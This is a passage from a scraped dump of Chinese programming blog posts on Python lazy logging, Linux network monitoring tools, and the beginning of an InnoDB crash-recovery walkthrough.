class=\"crayon-e\">addHandler</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">hander</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b92196962119-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b92196962119-11\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">getUserCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b92196962119-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">info</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'getUserCount is called'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b92196962119-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b92196962119-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b92196962119-15\"><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">debug</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"There are \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">str</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">getUserCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" users logged in now.\"</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n\n</div>\n<p>上面的代码可谓麻雀虽小五脏俱全，包含了使用logging框架的方方面面。第4行是named logger，第5行设置log level，第6行指定输出目标，第7行指定输出格式（包括时间，logger name，log level，具体的日志内容）。</p>\n<p>运行结果如下：</p>\n<blockquote><p>2017-12-02 17:52:20,049 – LazyLogging – DEBUG – getUserCount is called<br>\n2017-12-02 17:52:20,049 – LazyLogging – INFO – There are 1 users logged in now.</p></blockquote>\n<p>由于当前的log level是DEBUG，那么第15行的日志会输出，这是正常的。</p>\n<p>但是将log level改成INFO，<em>“getUserCount is called”</em>这条日志仍然会被输出。这就暴露出两个问题，第一，即使日志内容最终不会被输出，仍然会生成一个字符串；第二，一定会调用getUserCount 这个函数，而如果根据log lebel不需要输出日志，这两步都是没有必要的</p>\n<p>要解决第一个问题很简单，将第15行改成</p>\n<blockquote><p>logger.debug(“There are %s users logged in now.”, getUserCount())</p></blockquote>\n<p>即可，但是<em>“getUserCount is called”</em>这条日志仍然会被输出，即第二个问题仍然没有解决</p>\n<p>按照stackoverflow上的<a href=\"https://stackoverflow.com/questions/4148790/lazy-logger-message-string-evaluation\" target=\"_blank\">这篇文章</a>，也是可以解决第二个问题的，方案如下</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a63511bc2b96256833788\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass lazyEval:\r\n    def __init__(self, f, *args):\r\n        self.func = f\r\n        self.args = args\r\n\r\n    def __str__(self):\r\n        return str(self.func(*self.args))\r\n\r\nlogger.debug(\"There are %s users logged in now.\", lazyEval(getUserCount))</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b96256833788-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b96256833788-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b96256833788-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b96256833788-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b96256833788-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b96256833788-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b96256833788-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a63511bc2b96256833788-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a63511bc2b96256833788-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a63511bc2b96256833788-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lazyEval</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b96256833788-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">def </span><span class=\"crayon-e\">__init__</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b96256833788-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">func</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">f</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b96256833788-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">args</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">args</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b96256833788-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b96256833788-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">def </span><span class=\"crayon-e\">__str__</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b96256833788-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">str</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">func</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a63511bc2b96256833788-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a63511bc2b96256833788-9\"><span class=\"crayon-v\">logger</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">debug</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"There are %s users logged in now.\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lazyEval</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">getUserCount</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n\n</div>\n<p>在log lever为INFO的时候，可以发现<em>“getUserCount is called”</em>也不会被输出了，即不会调用getUserCount函数，做到了真正的lazy logging。</p>\n<p>但是，这是非常不好的写法！除非你们保证所调用的函数是没有副作用的（side－effect），即函数的调用无状态，不会改变程序的状态，否则程序的状态居然会依赖于log level，这是一个陷阱，一个坑，一点都不pythonic。</p>\n<h2>consider async logging</h2>\n<p>日志的记录也是要消耗时间的，这也是我们不能到处打印日志的原因。一般来说，logging框架的效率都是比较高的，但是如果profile发现日志的输出确实带来了不容忽视的消耗，那么也是值得优化的，其中的一个方法就是异步log，以避免日志输出阻塞线程</p>\n<h1>conclusion</h1>\n<p>在网上看到这么一句话</p>\n<blockquote><p>Logs are like car insurance. Nobody wants to pay for it, but when something goes wrong everyone wants the best available</p></blockquote>\n<p>log就像车辆保险，没人愿意为保险付钱，但是一旦出了问题谁都又想有保险可用。</p>\n<p>我们打印日志的时候都很随意，于是在差bug的时候，就会骂别人、或者几天前的自己：SB！</p>\n<p>从今天起，写好每一条日志吧，与君共勉！</p>\n<h1>参考</h1>\n<ul>\n<li><a href=\"http://book.mixu.net/distsys/time.html\" target=\"_blank\">Distributed systems for fun and profit</a></li>\n<li><a href=\"https://docs.python.org/2/library/logging.html#logrecord-attributes\" target=\"_blank\">python logging#logrecord-attributes</a></li>\n<li><a href=\"https://garygregory.wordpress.com/2015/10/08/the-art-of-logging-advanced-message-formatting/\" target=\"_blank\">the-art-of-logging-advanced-message-formatting</a></li>\n</ul>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113413\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113413votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113413\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 10 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/456ebee8cee612d98b57ddd51097ea8c6f411717.jpg"}
{"url_object_id": "dcf461a9dec974620d1cae3390ca0ade", "title": "十个不错的 Linux 网络监视工具", "url": "http://blog.jobbole.com/113367/", "create_date": "2017/12/22", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/0031ff9dcefbd194a2dbc1051d270807.png"], "praise_nums": 2, "comment_nums": 5, "favor_nums": 4, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.linuxandubuntu.com/home/best-network-monitoring-tools-for-linux\">Linuxandubuntu</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9153-1.html\">LCTT</a>   </div><p>保持对我们的网络的管理，防止任何程序过度使用网络、导致整个系统操作变慢，对管理员来说是至关重要的。有几个网络监视工具可以用于不同的操作系统。在这篇文章中，我们将讨论从 Linux 终端中运行的 10 个网络监视工具。它对不使用 GUI 而希望通过 SSH 来保持对网络管理的用户来说是非常理想的。</p>\n<h1 id=\"toc_1\">iftop</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/0031ff9dcefbd194a2dbc1051d270807.png\"><img class=\"aligncenter size-full wp-image-113368\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0031ff9dcefbd194a2dbc1051d270807.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>iftop network monitoring tool</em></p>\n<p>Linux 用户通常都熟悉 <code>top</code> —— 这是一个系统监视工具，它允许我们知道在我们的系统中实时运行的进程，并可以很容易地管理它们。<code>iftop</code> 与 <code>top</code> 应用程序类似，但它是专门监视网络的，通过它可以知道更多的关于网络的详细情况和使用网络的所有进程。</p>\n<p>我们可以从 <a href=\"http://www.ex-parrot.com/pdw/iftop/\">这个链接</a> 获取关于这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_2\">vnstat</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/c7c242518c7677eec7e5c7b44d70d9ca.png\"><img class=\"aligncenter size-full wp-image-113369\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/c7c242518c7677eec7e5c7b44d70d9ca.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>vnstat network monitoring tool</em></p>\n<p><code>vnstat</code> 是一个缺省包含在大多数 Linux 发行版中的网络监视工具。它允许我们对一个用户选择的时间周期内发送和接收的流量进行实时控制。</p>\n<p>我们可以从 <a href=\"http://humdi.net/vnstat/\">这个链接</a> 获取关于这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_3\">iptraf</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/cd2e2df478b8ada815a3182f13f8471f.gif\"><img class=\"aligncenter size-full wp-image-113370\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/cd2e2df478b8ada815a3182f13f8471f.gif\" alt=\"180514hf11ozfuf1dvpgmk\"></a></p>\n<p class=\"article_img_desc\" style=\"text-align: center\"><em>iptraf monitoring tool for linux</em></p>\n<p>IPTraf 是一个基于控制台的 Linux 实时网络监视程序。它会收集经过这个网络的各种各样的信息作为一个 IP 流量监视器，包括 TCP 标志信息、ICMP 详细情况、TCP / UDP 流量故障、TCP 连接包和字节计数。它也收集接口上全部的 TCP、UDP、…… IP 协议和非 IP 协议 ICMP 的校验和错误、接口活动等等的详细情况。（LCTT 译注：此处原文有误，径改之）</p>\n<p>我们可以从 <a href=\"http://iptraf.seul.org/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_4\">Monitorix – 系统和网络监视</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/ee5444cf29a457d16b868d948ea12e2b.png\"><img class=\"aligncenter size-full wp-image-113371\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/ee5444cf29a457d16b868d948ea12e2b.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>monitorix system monitoring tool for linux</em></p>\n<p>Monitorix 是一个轻量级的免费应用程序，它设计用于去监视尽可能多的 Linux / Unix 服务器的系统和网络资源。它里面添加了一个 HTTP web 服务器，可以定期去收集系统和网络信息，并且在一个图表中显示它们。它跟踪平均系统负载、内存分配、磁盘健康状态、系统服务、网络端口、邮件统计信息（Sendmail、Postfix、Dovecot 等等）、MySQL 统计信息以及其它的更多内容。它设计用于去管理系统的整体性能，以及帮助检测故障、瓶颈、异常活动等等。</p>\n<p>下载及更多 <a href=\"http://www.monitorix.org\">信息在这里</a>。</p>\n<h1 id=\"toc_5\">dstat</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/bb645c76ca4667edb3fd2b18e8fade5c.png\"><img class=\"aligncenter size-full wp-image-113372\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/bb645c76ca4667edb3fd2b18e8fade5c.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>dstat network monitoring tool</em></p>\n<p>这个监视器相比前面的几个知名度低一些，但是，在一些发行版中已经缺省包含了。</p>\n<p>我们可以从 <a href=\"http://dag.wiee.rs/home-made/dstat/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_6\">bwm-ng</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/c06fbf012db3866acdb9cfcf64ae35a7.png\"><img class=\"aligncenter size-full wp-image-113373\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/c06fbf012db3866acdb9cfcf64ae35a7.png\" alt=\"180512yyfcb2bvfbbbbpmh\"></a></p>\n<p style=\"text-align: center\"><em>bwm-ng monitoring tool</em></p>\n<p>这是最简化的工具之一。它允许你去从连接中交互式取得数据，并且，为了便于其它设备使用，在取得数据的同时，能以某些格式导出它们。</p>\n<p>我们可以从 <a href=\"http://sourceforge.net/projects/bwmng/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_7\">ibmonitor</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/cd3080fed79dc64b9b4e698d0316dc7a.jpg\"><img class=\"aligncenter size-full wp-image-113375\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/cd3080fed79dc64b9b4e698d0316dc7a.jpg\" alt=\"180516yvm7wevqenuxebnu\"></a></p>\n<p style=\"text-align: center\"><em>ibmonitor tool for linux</em></p>\n<p>与上面的类似，它显示连接接口上过滤后的网络流量，并且，明确地将接收流量和发送流量区分开。</p>\n<p>我们可以从 <a href=\"http://ibmonitor.sourceforge.net/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_8\">Htop – Linux 进程跟踪</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/0e1a55542e556c9e11f2d16d59601154.png\"><img class=\"aligncenter size-full wp-image-113376\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0e1a55542e556c9e11f2d16d59601154.png\" alt=\"180517ddgb0xr4gr69dnbt\"></a></p>\n<p style=\"text-align: center\"><em>htop linux processes monitoring tool</em></p>\n<p>Htop 是一个更先进的、交互式的、实时的 Linux 进程跟踪工具。它类似于 Linux 的 top 命令，但是有一些更高级的特性，比如，一个更易于使用的进程管理界面、快捷键、水平和垂直的进程视图等更多特性。Htop 是一个第三方工具，它不包含在 Linux 系统中，你必须使用 <strong>YUM</strong> 或者 <strong>APT-GET</strong> 或者其它的包管理工具去安装它。关于安装它的更多信息，读<a href=\"http://wesharethis.com/knowledgebase/htop-and-atop/\">这篇文章</a>。</p>\n<p>我们可以从 <a href=\"http://hisham.hm/htop/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_9\">arpwatch – 以太网活动监视器</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/58bead3d8a40a0d640c3c5e93ef9a959.png\"><img class=\"aligncenter size-full wp-image-113379\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/58bead3d8a40a0d640c3c5e93ef9a959.png\" alt=\"180517ddgb0xr4gr69dnbt\"></a></p>\n<p style=\"text-align: center\"><em>arpwatch ethernet monitoring tool</em></p>\n<p>arpwatch 是一个设计用于在 Linux 网络中去管理以太网通讯的地址解析程序。它持续监视以太网通讯并记录一个网络中的 IP 地址和 MAC 地址的变化，该变化同时也会记录一个时间戳。它也有一个功能是当一对 IP 和 MAC 地址被添加或者发生变化时，发送一封邮件给系统管理员。在一个网络中发生 ARP 攻击时，这个功能非常有用。</p>\n<p>我们可以从 <a href=\"http://linux.softpedia.com/get/System/Monitoring/arpwatch-NG-7612.shtml\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_10\">Wireshark – 网络监视工具</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/3eeac5779e89f77d55ef32a89c2f174c.jpg\"><img class=\"aligncenter size-full wp-image-113380\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/3eeac5779e89f77d55ef32a89c2f174c.jpg\" alt=\"180520x8b9tis5rsyhh89w\"></a></p>\n<p style=\"text-align: center\"><em>wireshark network monitoring tool</em></p>\n<p><a href=\"https://www.wireshark.org/\">Wireshark</a> 是一个自由的应用程序，它允许你去捕获和查看前往你的系统和从你的系统中返回的信息，它可以去深入到数据包中并查看每个包的内容 —— 以分别满足你的不同需求。它一般用于去研究协议问题和去创建和测试程序的特别情况。这个开源分析器是一个被公认的分析器商业标准，它的流行要归功于其久负盛名。</p>\n<p>最初它被叫做 Ethereal，Wireshark 有轻量化的、易于理解的界面，它能分类显示来自不同的真实系统上的协议信息。</p>\n<h1 id=\"toc_11\">结论</h1>\n<p>在这篇文章中，我们看了几个开源的网络监视工具。虽然我们从这些工具中挑选出来的认为是“最佳的”，并不意味着它们都是最适合你的需要的。例如，现在有很多的开源监视工具，比如，OpenNMS、Cacti、和 Zennos，并且，你需要去从你的个体情况考虑它们的每个工具的优势。</p>\n<p>另外，还有不同的、更适合你的需要的不开源的工具。</p>\n<p>你知道的或者使用的在 Linux 终端中的更多网络监视工具还有哪些？</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113367\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113367votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113367\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/f45742993aebb40dc85b097aeb88d163712b18e7.jpg"}
{"url_object_id": "7b2e7df15f26a1c4ddc1a2388108ab71", "title": "MySQL 引擎特性：InnoDB崩溃恢复", "url": "http://blog.jobbole.com/113312/", "create_date": "2017/12/13", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 2, "tags": "IT技术,MySQL,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/coderyuhui/p/7191413.html\">水中的泪</a>   </div><h2 id=\"前言\">前言</h2>\n<p>数据库系统与文件系统最大的区别在于数据库能保证操作的原子性，一个操作要么不做要么都做，即使在数据库宕机的情况下，也不会出现操作一半的情况，这个就需要数据库的日志和一套完善的崩溃恢复机制来保证。本文仔细剖析了InnoDB的崩溃恢复流程，代码基于5.6分支。</p>\n<h2 id=\"基础知识\">基础知识</h2>\n<p><strong><em>lsn: </em></strong> 可以理解为数据库从创建以来产生的redo日志量，这个值越大，说明数据库的更新越多，也可以理解为更新的时刻。此外，每个数据页上也有一个lsn，表示最后被修改时的lsn，值越大表示越晚被修改。比如，数据页A的lsn为100，数据页B的lsn为200，checkpoint lsn为150，系统lsn为300，表示当前系统已经更新到300，小于150的数据页已经被刷到磁盘上，因此数据页A的最新数据一定在磁盘上，而数据页B则不一定，有可能还在内存中。<br>\n<strong><em>redo日志: </em></strong> 现代数据库都需要写redo日志，例如修改一条数据，首先写redo日志，然后再写数据。在写完redo日志后，就直接给客户端返回成功。这样虽然看过去多写了一次盘，但是由于把对磁盘的随机写入(写数据)转换成了顺序的写入(写redo日志)，性能有很大幅度的提高。当数据库挂了之后，通过扫描redo日志，就能找出那些没有刷盘的数据页(在崩溃之前可能数据页仅仅在内存中修改了，但是还没来得及写盘)，保证数据不丢。<br>\n<strong><em>undo日志: </em></strong> 数据库还提供类似撤销的功能，当你发现修改错一些数据时，可以使用rollback指令回滚之前的操作。这个功能需要undo日志来支持。此外，现代的关系型数据库为了提高并发(同一条记录，不同线程的读取不冲突，读写和写读不冲突，只有同时写才冲突)，都实现了类似MVCC的机制，在InnoDB中，这个也依赖undo日志。为了实现统一的管理，与redo日志不同，undo日志在Buffer Pool中有对应的数据页，与普通的数据页一起管理，依据LRU规则也会被淘汰出内存，后续再从磁盘读取。与普通的数据页一样，对undo页的修改，也需要先写redo日志。<br>\n<strong><em>检查点: </em></strong> 英文名为checkpoint。数据库为了提高性能，数据页在内存修改后并不是每次都会刷到磁盘上。checkpoint之前的数据页保证一定落盘了，这样之前的日志就没有用了(由于InnoDB redolog日志循环使用，这时这部分日志就可以被覆盖)，checkpoint之后的数据页有可能落盘，也有可能没有落盘，所以checkpoint之后的日志在崩溃恢复的时候还是需要被使用的。InnoDB会依据脏页的刷新情况，定期推进checkpoint，从而减少数据库崩溃恢复的时间。检查点的信息在第一个日志文件的头部。<br>\n<strong><em>崩溃恢复: </em></strong> 用户修改了数据，并且收到了成功的消息，然而对数据库来说，可能这个时候修改后的数据还没有落盘，如果这时候数据库挂了，重启后，数据库需要从日志中把这些修改后的数据给捞出来，重新写入磁盘，保证用户的数据不丢。这个从日志中捞数据的过程就是崩溃恢复的主要任务，也可以成为数据库前滚。当然，在崩溃恢复中还需要回滚没有提交的事务，提交没有提交成功的事务。由于回滚操作需要undo日志的支持，undo日志的完整性和可靠性需要redo日志来保证，所以崩溃恢复先做redo前滚，然后做undo回滚。</p>\n<p>我们从源码角度仔细剖析一下数据库崩溃恢复过程。整个过程都在引擎初始化阶段完成(<code>innobase_init</code>)，其中最主要的函数是<code>innobase_start_or_create_for_mysql</code>，innodb通过这个函数完成创建和初始化，包括崩溃恢复。首先来介绍一下数据库的前滚。</p>\n<h2 id=\"redo日志前滚数据库\">redo日志前滚数据库</h2>\n<p>前滚数据库，主要分为两阶段，首先是日志扫描阶段，扫描阶段按照数据页的space_id和page_no分发redo日志到hash_table中，保证同一个数据页的日志被分发到同一个哈希桶中，且按照lsn大小从小到大排序。扫描完后，再遍历整个哈希表，依次应用每个数据页的日志，应用完后，在数据页的状态上至少恢复到了崩溃之前的状态。我们来详细分析一下代码。<br>\n首先，打开所有的ibdata文件(<code>open_or_create_data_files</code>)(ibdata可以有多个)，每个ibdata文件有个flush_lsn在头部，计算出这些文件中的max_flush_lsn和min_flush_lsn，因为ibdata也有可能有数据没写完整，需要恢复，后续(<code>recv_recovery_from_checkpoint_start_func</code>)通过比较checkpont_lsn和这两个值来确定是否需要对ibdata前滚。<br>\n接着，打开系统表空间和日志表空间的所有文件(<code>fil_open_log_and_system_tablespace_files</code>)，防止出现文件句柄不足，清空buffer pool(<code>buf_pool_invalidate</code>)。接下来就进入最最核心的函数:recv_recovery_from_checkpoint_start_func，注意，即使数据库是正常关闭的，也会进入。<br>\n虽然<code>recv_recovery_from_checkpoint_start_func</code>看过去很冗长，但是很多代码都是为了LOG_ARCHIVE特性而编写的，真正数据崩溃恢复的代码其实不多。<br>\n首先，初始化一些变量，查看<code>srv_force_recovery</code>这个变量，如果用户设置跳过前滚阶段，函数直接返回。<br>\n接着，初始化<code>recv_sys</code>结构，分配hash_table的大小，同时初始化flush list 